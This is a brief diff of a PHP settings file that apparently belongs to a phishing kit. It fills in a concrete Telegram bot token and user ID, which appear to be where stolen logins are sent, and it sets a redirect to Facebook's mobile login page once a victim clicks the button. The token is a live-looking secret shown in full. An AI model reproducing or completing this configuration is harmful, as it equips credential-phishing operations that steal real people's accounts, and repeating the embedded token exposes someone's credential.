@@ -11,13 +11,13 @@
 
 
 //token bot telegram get in @botfather
-$token = "TOKEN-BOT-TELEGRAM";
+$token = "5907265082:AAEQnMR1dDz3RRMZ4S8gSuKpzaKl60MjGac";
 
 //for multi userid use like this:
 //$userid = "xxxx","xxxx","xxxx";
 
 //for single user
-$userid = "USER-ID-TELEGRAM";
+$userid = "1921720430";
 
 //if click the login button it will be redirected to account.google.com, don't change it if you don't understand
 $location = "https://m.facebook.com";
